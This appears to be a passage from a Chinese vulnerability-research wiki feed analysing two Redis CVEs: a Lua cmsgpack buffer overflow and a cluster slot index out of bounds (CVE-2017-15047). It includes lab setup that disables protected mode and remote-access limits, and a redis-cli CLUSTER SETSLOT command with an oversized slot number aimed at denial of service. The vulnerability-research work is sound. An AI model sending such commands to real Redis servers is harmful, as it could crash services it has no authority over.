&quot;msgpack.safe&quot;</code>。安全版本将错误返回为（nil，errstring）。</p><p>​    但是，由于Lua数字和表类型的性质，必须很好地理解库的一些行为，以避免出现问题：</p></li><li><p>仅当<em>所有</em>键均由以1开头，以N结尾，不带孔且没有其他非数字键的增量整数组成时，表才转换为MessagePack数组类型。所有其他表都将转换为映射。</p></li><li><p>空表总是转换为MessagePack数组，其理由是空列表比空映射（通常用于表示具有字段的对象）更为常见。</p></li><li><p>如果floor（number）== number，则Lua数字将转换为整数类型，否则将其转换为MessagePack浮点或双精度值。</p></li><li><p>当Lua数转换为float或double时，如果与double表示相比不损失精度，则首选前者。</p></li><li><p>将MessagePack大整数（64位）转换为Lua编号时，结果编号可能不会代表原始编号，而只是一个近似值。这是不可避免的，因为Lua数值类型通常是双精度浮点类型。</p></li></ul><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><p>​        deps/lua/src/lua_cmsgpack.c</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2018-11218-Redis-Lua%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/4.png"></p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2018-11218-Redis-Lua%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/5.png"></p><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>​        发送cmsgpack.pack调用，并设置超多的超长字符串参数</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2018-11218-Redis-Lua%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/6.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://github.com/redis/redis/commit/52a00201fca331217c3b4b8b634f6a0f57d6b7d3">https://github.com/redis/redis/commit/52a00201fca331217c3b4b8b634f6a0f57d6b7d3</a></li><li><a href="https://github.com/redis/redis/commit/90b6337c155aa0330143f5b0a0af1d430271d400">https://github.com/redis/redis/commit/90b6337c155aa0330143f5b0a0af1d430271d400</a></li><li><a href="https://gist.github.com/antirez/82445fcbea6d9b19f97014cc6cc79f8a">https://gist.github.com/antirez/82445fcbea6d9b19f97014cc6cc79f8a</a></li><li><a href="https://gist.github.com/antirez/bca0ad7a9c60c72e9600c7f720e9d035">https://gist.github.com/antirez/bca0ad7a9c60c72e9600c7f720e9d035</a></li><li><a href="http://antirez.com/news/119">http://antirez.com/news/119</a></li><li><a href="https://github.com/redis/redis/issues/5017">https://github.com/redis/redis/issues/5017</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h2&gt;&lt;h3 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="漏洞相关" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"/>
    
    <category term="Redis" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/"/>
    
    
    <category term="Redis" scheme="http://example.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-15047_Redis数组索引越界漏洞</title>
    <link href="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-07-06T08:54:19.000Z</published>
    <updated>2021-07-06T08:57:38.476Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><ul><li>漏洞名称：Redis cluster.c clusterLoadConfig数组索引越界漏洞</li><li>漏洞编号：CVE-2017-15047</li><li>漏洞类型：缓冲区错误</li><li>CVSS评分：【CVSS v2.0：】【CVSS v3.0：9.8】</li><li>漏洞危害等级：高危</li></ul><h3 id="组件概述"><a href="#组件概述" class="headerlink" title="组件概述"></a>组件概述</h3><p>​        Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><p>​        它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>​        Redis 4.0.2版本中的cluster.c文件的‘clusterLoadConfig’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（越边界数组索引和应用程序崩溃）。</p><h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><p>​        redis-server以集群形式部署，攻击者可以访问到redis-server。</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>​    Redis up to 4.0.2</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/redis/redis/commit/ffcf7d5ab1e98d84c28af9bea7be76c6737820ad">https://github.com/redis/redis/commit/ffcf7d5ab1e98d84c28af9bea7be76c6737820ad</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="应用协议"><a href="#应用协议" class="headerlink" title="应用协议"></a>应用协议</h3><p>6379/RESP</p><h3 id="环境安装-搭建"><a href="#环境安装-搭建" class="headerlink" title="环境安装/搭建"></a>环境安装/搭建</h3><p>​        在环境共享服务器中获取到环境源码\安装包，地址为:\\10.251.0.11\R-Redis\redis-3.2.7.tar.zip文件，解压编译即可。</p><p>​        启动前先更改配置文件redis.conf，开启集群模式。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/5.png"></p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/6.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">################################ REDIS CLUSTER ###############################</span><br><span class="line">#集群开关，默认是不开启集群模式。</span><br><span class="line">cluster-enabled yes</span><br><span class="line"></span><br><span class="line">#集群配置文件的名称，每个节点都有一个集群相关的配置文件，持久化保存集群的信息。这个文件并不需要手动配置，这个配置文件有Redis生成并更新，每个Redis集群节点需要一个单独的配置文件，请确保与实例运行的系统中配置文件名称不冲突</span><br><span class="line">cluster-config-file nodes-7021.conf</span><br><span class="line"></span><br><span class="line">#节点互连超时的阀值。集群节点超时毫秒数</span><br><span class="line">cluster-node-timeout 30000</span><br><span class="line"></span><br><span class="line">#在进行故障转移的时候，全部slave都会请求申请为master，但是有些slave可能与master断开连接一段时间了，导致数据过于陈旧，这样的slave不应该被提升&gt;为master。该参数就是用来判断slave节点与master断线的时间是否过长。判断方法是：</span><br><span class="line">#比较slave断开连接的时间和(node-timeout * slave-validity-factor) + repl-ping-slave-period</span><br><span class="line">#如果节点超时时间为三十秒, 并且slave-validity-factor为10,假设默认的repl-ping-slave-period是10秒，即如果超过310秒slave将不会尝试进行故障转移</span><br><span class="line">#可能出现由于某主节点失联却没有从节点能顶上的情况，从而导致集群不能正常工作，在这种情况下，只有等到原来的主节点重新回归到集群，集群才恢复运作</span><br><span class="line">#如果设置成０，则无论从节点与主节点失联多久，从节点都会尝试升级成主节</span><br><span class="line">cluster-slave-validity-factor 10</span><br><span class="line"></span><br><span class="line">#master的slave数量大于该值，slave才能迁移到其他孤立master上，如这个参数若被设为2，那么只有当一个主节点拥有2 个可工作的从节点时，它的一个从节&gt;点会尝试迁移。</span><br><span class="line">#主节点需要的最小从节点数，只有达到这个数，主节点失败时，它从节点才会进行迁移。</span><br><span class="line"># cluster-migration-barrier 1</span><br><span class="line"></span><br><span class="line">#默认情况下，集群全部的slot有节点分配，集群状态才为ok，才能提供服务。设置为no，可以在slot没有全部分配的时候提供服务。不建议打开该配置，这样会</span><br><span class="line">造成分区的时候，小分区的master一直在接受写请求，而造成很长时间数据不一致。</span><br><span class="line">#在部分key所在的节点不可用时，如果此参数设置为”yes”(默认值), 则整个集群停止接受操作；如果此参数设置为”no”，则集群依然为可达节点上的key提供读&gt;操作</span><br><span class="line">cluster-require-full-coverage yes</span><br></pre></td></tr></table></figure><p>​        注释bind 127.0.0.1，开启远程访问。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/16.png"></p><p>​        关闭保护模式.</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/17.png"></p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>​        在攻击机上发送cluster setslot命令，创建一个大于16384的槽号，为了达到拒绝服务目的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 10.251.0.36 CLUSTER SETSLOT 16385 NODE node</span><br></pre></td></tr></table></figure><p>​        复现redis-server报错</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/9.png"></p><p>​        配置redis.conf，按照redis.conf配置启动靶机的redis-server。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server redis.conf</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/7.png"></p><p>​        靶机上测试一下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CLUSTER SETSLOT 16385 NODE node</span><br></pre></td></tr></table></figure><p>​        发现已经修复了此漏洞，redis-server对槽号大小做了边界检查。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/8.png"></p><p>​        远程测试也是报此错误。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/9.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="技术背景"><a href="#技术背景" class="headerlink" title="技术背景"></a>技术背景</h3><p>​        Redis是轻量级的，非易失性键值数据存储。 它通过Redis序列化协议（RESP）提供对简单易变数据结构的访问，该协议是基于TCP的协议。 与大多数其他数据库一样，Redis遵循客户端—服务器模型。 客户端能够通过Redis命令在Redis服务器上创建，修改和检索记录。 </p><p>​        例如，以下命令创建“ TEST”字符串记录并将其分配给“ 1234”键值，将此记录修改为“ TEST2”并分别检索记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET 1234 TEST</span><br><span class="line">GETSET 1234 TEST2</span><br><span class="line">GET 1234</span><br></pre></td></tr></table></figure><p>​        有关Redis命令的完整列表，请参考 <a href="http://redis.io/commands">http://redis.io/commands</a></p><p>​        Redis客户端通过端口6379通过TCP使用Redis序列化协议（RESP）与服务器进行通信。可通过 <a href="http://redis.io/topics/protocol%E8%8E%B7%E5%BE%97%E8%AF%A5%E5%8D%8F%E8%AE%AE%E8%AF%A6%E7%BB%86%E8%AF%B4%E6%98%8E%E3%80%82">http://redis.io/topics/protocol获得该协议详细说明。</a> RESP使用五种数据类型，这些数据类型由相应数据的第一个字节标识：</p><ul><li><p>简单字符串以“ +”字符开头</p></li><li><p>错误以“-”字符开头</p></li><li><p>整数以“：”字符开头</p></li><li><p>批量字符串以“ $”字符开头</p></li><li><p>数组以“ *”字符开头</p><p>​    批量字符串以“ $”字符开头，后跟相应字符串的长度。 以下重点介绍如何将“ Sangfor”表示为大容量字符串：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$7 CRLF</span><br><span class="line">TELUS</span><br></pre></td></tr></table></figure><p>​        其中CRLF表示新的行序列回车（CR），后跟换行（LF）。 </p><p>​        RESP数组以“ *”字符开头，后跟数组中的元素数。 下面说明了一个由2个元素组成的大容量字符串数组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*2 CRLF</span><br><span class="line">$7 CRLF</span><br><span class="line">Sangfor CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure><p>​        所有Redis命令都通过RESP字符串数组发送到服务器。 例如，上述SET命令将以下形式发送：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*3 CRLF</span><br><span class="line">$3 CRLF</span><br><span class="line">SET CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">1234 CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure><p>​        Lua是Redis 支持的轻量级脚本语言。 Redis内置了Lua解释器。Lua在Redis中的使用方法，可参考<a href="https://www.redisgreen.net/blog/intro-to-lua-for-redis-programmers/">https://www.redisgreen.net/blog/intro-to-lua-for-redis-programmers/</a></p><p><strong>一、Redis Cluster简单概述</strong></p><p><strong>1. Redis Cluster特点</strong></p><ul><li><strong>多主多从，去中心化</strong>：从节点作为备用，复制主节点，不做读写操作，不提供服务</li><li><strong>不支持处理多个key</strong>：因为数据分散在多个节点，在数据量大高并发的情况下会影响性能；</li><li><strong>支持动态扩容节点</strong>：这是Rerdis Cluster最大的优点之一；</li><li><strong>节点之间相互通信，相互选举，不再依赖sentinel</strong>：准确来说是主节点之间相互“监督”，保证及时故障转移</li></ul><p><strong>2.Redis Cluster与其它集群模式的区别</strong></p><ul><li>相比较sentinel模式，<strong>多个master节点保证主要业务（比如master节点主要负责写）稳定性，不需要搭建多个sentinel实例监控一个master节点</strong>；</li><li>相比较一主多从的模式，不需要手动切换<strong>，具有自我故障检测，故障转移的特点</strong>；</li><li>相比较其他两个模式而言，<strong>对数据进行分片（sharding），不同节点存储的数据是不一样的</strong>；</li><li>从某种程度上来说，Sentinel模式主要针对高可用（HA），<strong>而Cluster模式是不仅针对大数据量，高并发，同时也支持HA。</strong></li></ul><p><strong>二、Redis Cluster如何集群实现？</strong></p><p><strong>1.Redis Cluster是如何将数据分片的？—-哈希槽Slot</strong><br>　　<strong>（1）哈希槽介绍</strong></p><p>​        Redis集群使用一种称作一致性哈希的复合分区形式（组合了哈希分区和列表分袂的特征来计算键的归属实例），键的CRC16哈希值被称为哈希槽。比如对于三个Redis节点，哈希槽的分配方式如下：</p><p>　　第一个节点拥有0-5500哈希槽</p><pre><code> 第二节点拥有5501-11000哈希槽 第三节点拥有剩余的11001-16384哈希槽</code></pre><p>　　 一个键的对应的哈希槽通过计算键的CRC16 哈希值，然后对16384进行取模得到：HASH_SLOT=CRC16(key) modulo 16383，Redis提供了CLUSTER KEYSLOT命令来执行哈希槽的计算：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CLUSTER KEYSLOT name</span><br></pre></td></tr></table></figure><p><strong>集群在线重配置（live reconfiguration）</strong></p><p>​        Redis 集群支持在集群运行的过程中添加或者移除节点。</p><p>​        实际上， 节点的添加操作和节点的删除操作可以抽象成同一个操作， 那就是， 将哈希槽从一个节点移动到另一个节点：</p><ul><li>添加一个新节点到集群， 等于将其他已存在节点的槽移动到一个空白的新节点里面。</li><li>从集群中移除一个节点， 等于将被移除节点的所有槽移动到集群的其他节点上面去。</li></ul><p>​        因此， 实现 Redis 集群在线重配置的核心就是将槽从一个节点移动到另一个节点的能力。 因为一个哈希槽实际上就是一些键的集合， 所以 Redis 集群在重哈希（rehash）时真正要做的， 就是将一些键从一个节点移动到另一个节点。</p><p>​        要理解 Redis 集群如何将槽从一个节点移动到另一个节点， 我们需要对 <code>CLUSTER</code> 命令的各个子命令进行介绍， 这些命理负责管理集群节点的槽转换表（slots translation table）。</p><p>以下是 <code>CLUSTER</code> 命令可用的子命令：</p><ul><li><code>CLUSTER ADDSLOTS slot1 [slot2] ... [slotN]</code></li><li><code>CLUSTER DELSLOTS slot1 [slot2] ... [slotN]</code></li><li><code>CLUSTER SETSLOT slot NODE node</code></li><li><code>CLUSTER SETSLOT slot MIGRATING node</code></li><li><code>CLUSTER SETSLOT slot IMPORTING node</code></li></ul><p>​        最开头的两条命令 <code>ADDSLOTS</code> 和 <code>DELSLOTS</code> 分别用于向节点指派（assign）或者移除节点， 当槽被指派或者移除之后， 节点会将这一信息通过 Gossip 协议传播到整个集群。 <code>ADDSLOTS</code> 命令通常在新创建集群时， 作为一种快速地将各个槽指派给各个节点的手段来使用。</p><p><code>CLUSTER SETSLOT slot NODE node</code> 子命令可以将指定的槽 <code>slot</code> 指派给节点 <code>node</code> 。</p><p>​        至于 <code>CLUSTER SETSLOT slot MIGRATING node</code> 命令和 <code>CLUSTER SETSLOT slot IMPORTING node</code> 命令， 前者用于将给定节点 <code>node</code> 中的槽 <code>slot</code> 迁移出节点， 而后者用于将给定槽 <code>slot</code> 导入到节点 <code>node</code> ：</p><ul><li><p>当一个槽被设置为 <code>MIGRATING</code> 状态时， 原来持有这个槽的节点仍然会继续接受关于这个槽的命令请求， 但只有命令所处理的键仍然存在于节点时， 节点才会处理这个命令请求。</p><p>如果命令所使用的键不存在与该节点， 那么节点将向客户端返回一个 <code>-ASK</code> 转向（redirection）错误， 告知客户端， 要将命令请求发送到槽的迁移目标节点。</p></li><li><p>当一个槽被设置为 <code>IMPORTING</code> 状态时， 节点仅在接收到 <code>ASKING</code> 命令之后， 才会接受关于这个槽的命令请求。</p><p>如果客户端没有向节点发送 <code>ASKING</code> 命令， 那么节点会使用 <code>-MOVED</code> 转向错误将命令请求转向至真正负责处理这个槽的节点。</p><p>上面关于 <code>MIGRATING</code> 和 <code>IMPORTING</code> 的说明有些难懂， 让我们用一个实际的实例来说明一下。</p><p>假设现在， 我们有 A 和 B 两个节点， 并且我们想将槽 <code>8</code> 从节点 A 移动到节点 B ， 于是我们：</p></li><li><p>向节点 B 发送命令 <code>CLUSTER SETSLOT 8 IMPORTING A</code></p></li><li><p>向节点 A 发送命令 <code>CLUSTER SETSLOT 8 MIGRATING B</code></p></li></ul><p>每当客户端向其他节点发送关于哈希槽 <code>8</code> 的命令请求时， 这些节点都会向客户端返回指向节点 A 的转向信息：</p><ul><li><p>如果命令要处理的键已经存在于槽 <code>8</code> 里面， 那么这个命令将由节点 A 处理。</p></li><li><p>如果命令要处理的键未存在于槽 <code>8</code> 里面（比如说，要向槽添加一个新的键）， 那么这个命令由节点 B 处理。</p><p>​    这种机制将使得节点 A 不再创建关于槽 <code>8</code> 的任何新键。</p></li></ul><p>​        与此同时， 一个特殊的客户端 <code>redis-trib</code> 以及 Redis 集群配置程序（configuration utility）会将节点 A 中槽 <code>8</code> 里面的键移动到节点 B 。</p><p>键的移动操作由以下两个命令执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CLUSTER GETKEYSINSLOT slot count</span><br></pre></td></tr></table></figure><p>​        上面的命令会让节点返回 <code>count</code> 个 <code>slot</code> 槽中的键， 对于命令所返回的每个键， <code>redis-trib</code> 都会向节点 A 发送一条 [MIGRATE host port key destination-db timeout <a href="http://redisdoc.com/internal/migrate.html#migrate">COPY] [REPLACE]</a> 命令， 该命令会将所指定的键原子地（atomic）从节点 A 移动到节点 B （在移动键期间，两个节点都会处于阻塞状态，以免出现竞争条件）。</p><p>​        以下为 [MIGRATE host port key destination-db timeout <a href="http://redisdoc.com/internal/migrate.html#migrate">COPY] [REPLACE]</a> 命令的运作原理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MIGRATE target_host target_port key target_database id timeout</span><br></pre></td></tr></table></figure><p>​        执行 [MIGRATE host port key destination-db timeout <a href="http://redisdoc.com/internal/migrate.html#migrate">COPY] [REPLACE]</a> 命令的节点会连接到 <code>target</code> 节点， 并将序列化后的 <code>key</code> 数据发送给 <code>target</code> ， 一旦 <code>target</code> 返回 <code>OK</code> ， 节点就将自己的 <code>key</code> 从数据库中删除。</p><p>​        从一个外部客户端的视角来看， 在某个时间点上， 键 <code>key</code> 要么存在于节点 A ， 要么存在于节点 B ， 但不会同时存在于节点 A 和节点 B 。</p><p>​        因为 Redis 集群只使用 <code>0</code> 号数据库， 所以当 [MIGRATE host port key destination-db timeout <a href="http://redisdoc.com/internal/migrate.html#migrate">COPY] [REPLACE]</a> 命令被用于执行集群操作时， <code>target_database</code> 的值总是 <code>0</code> 。</p><p><code>target_database</code> 参数的存在是为了让 [MIGRATE host port key destination-db timeout <a href="http://redisdoc.com/internal/migrate.html#migrate">COPY] [REPLACE]</a> 命令成为一个通用命令， 从而可以作用于集群以外的其他功能。</p><p>​        我们对 [MIGRATE host port key destination-db timeout <a href="http://redisdoc.com/internal/migrate.html#migrate">COPY] [REPLACE]</a> 命令做了优化， 使得它即使在传输包含多个元素的列表键这样的复杂数据时， 也可以保持高效。</p><p>​        不过， 尽管 [MIGRATE host port key destination-db timeout <a href="http://redisdoc.com/internal/migrate.html#migrate">COPY] [REPLACE]</a> 非常高效， 对一个键非常多、并且键的数据量非常大的集群来说， 集群重配置还是会占用大量的时间， 可能会导致集群没办法适应那些对于响应时间有严格要求的应用程序。</p><p><strong>附所有redis-cluster相关的集群命令：</strong></p><ul><li>cluster info ：打印集群的信息</li><li>cluster nodes ：列出集群当前已知的所有节点（ node），以及这些节点的相关信息。</li><li>cluster meet <ip> <port> ：将 ip 和 port 所指定的节点添加到集群当中。</port></ip></li><li>cluster forget <node_id> ：从集群中移除 node_id 指定的节点。</node_id></li><li>cluster replicate <master_node_id> ：将当前从节点设置为 node_id 指定的master节点的slave节点。只能针对slave节点操作。</master_node_id></li><li>cluster saveconfig ：将节点的配置文件保存到硬盘里面。</li><li>cluster addslots <slot> [slot …] ：将一个或多个槽（ slot）指派（ assign）给当前节点。</slot></li><li>cluster delslots <slot> [slot …] ：移除一个或多个槽对当前节点的指派。</slot></li><li>cluster flushslots ：移除指派给当前节点的所有槽，让当前节点变成一个没有指派任何槽的节点。</li><li>cluster setslot <slot> node <node_id> ：将槽 slot 指派给 node_id 指定的节点，如果槽已经指派给</node_id></slot></li><li>cluster setslot <slot> migrating <node_id> ：将本节点的槽 slot 迁移到 node_id 指定的节点中。</node_id></slot></li><li>cluster setslot <slot> importing <node_id> ：从 node_id 指定的节点中导入槽 slot 到本节点。</node_id></slot></li><li>cluster setslot <slot> stable ：取消对槽 slot 的导入（ import）或者迁移（ migrate）。</slot></li><li>cluster keyslot <key> ：计算键 key 应该被放置在哪个槽上。</key></li><li>cluster countkeysinslot <slot> ：返回槽 slot 目前包含的键值对数量。</slot></li><li>cluster getkeysinslot <slot> <count> ：返回 count 个 slot 槽中的键 。</count></slot></li></ul><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>​        漏洞产生原因是在集群模式部署下，使用cluster相关命令时，对slot值没有做边界校验，导致直接索引migrating_slots_to和migrating_slots_from数组并赋值，而migrating_slots_to和migrating_slots_from数组大小由CLUSTER_SLOTS(16384)确定。一旦slot值大于16384，则会导致数组边界溢出。</p><p>src/cluster.h：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/1.png"></p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/2.png"></p><p>​        在/redis/src/cluster.c的clusterLoadConfig函数，允许一个缓冲区溢出漏洞从用户可控输入数组索引之中。易受攻击的代码是：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/3.png"></p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/4.png"></p><p>​        slot变量接收atoi的输出，该输出在此处运行：<code>slot = atoi(argv[j]+1);</code></p><p>​        现在，argv [j]基本上是使用sdssplitargs放入数组进行进一步处理的每行（存储在line []中）的参数。具有有限访问权限的攻击者将可以通过，超大的slot值而强制发生数组错误异常而触发内存损坏问题，甚至可能执行代码。</p><p>​        但是，此漏洞能不能远程触发还有待分析。</p><p>​        全局搜索clusterLoadConfig函数，只有在clusterInit函数中被调用一次，也就是在redis-server启动集群模式之初就开始执行，攻击者很难远程执行。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/13.png"></p><p>​        clusterLoadConfig函数加载cluster配置信息失败时的报错信息，这一点在靶机redis-server启动时可以验证：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/7.png"></p><p>​        故猜测无法远程利用此函数达到远程拒绝服务攻击。</p><p>​    clusterLoadConfig函数，在cluster创建时加载集群的配置文件，在redis.conf中可以找到相关信息：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/14.png"></p><p>​        